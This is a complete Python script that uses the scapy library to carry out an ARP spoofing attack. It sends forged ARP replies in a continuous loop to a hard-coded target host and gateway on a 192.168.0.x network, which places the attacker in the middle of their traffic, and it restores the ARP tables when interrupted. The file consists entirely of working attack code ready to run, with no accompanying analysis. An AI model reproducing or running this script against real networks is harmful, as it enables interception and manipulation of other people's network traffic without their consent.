import scapy.all as scapy
import time

def get_mac(ip):
    arp_req = scapy.ARP(pdst = ip)
    broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")
    arp_req_broadcast =  broadcast / arp_req
    answer_list = scapy.srp(arp_req_broadcast, timeout = 5, verbose = False)[0]
    return answer_list[0][1].hwsrc


def spoof(ip_target, ip_spoof):
    packet = scapy.ARP(op = 2, pdst = ip_target, hwdst = get_mac(ip_target), psrc = ip_spoof)
    scapy.send(packet, verbose = False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
    scapy.send(packet, verbose = False)

ip_target = "192.168.0.108" #Target Ip
ip_gateway = "192.168.0.100" #Gateway Ip

try:

    sent_packets_count = 0
    while True:
        spoof(ip_target, ip_gateway)
        spoof(ip_gateway, ip_target)
        sent_packets_count = sent_packets_count + 2
        print("\n[+]Packets Sent " + str(sent_packets_count), end="")

except KeyboardInterrupt:
    print("\n Exiting")
    restore(ip_gateway, ip_target)
    restore(ip_target, ip_gateway)
    print("Arp Spoof Stoped")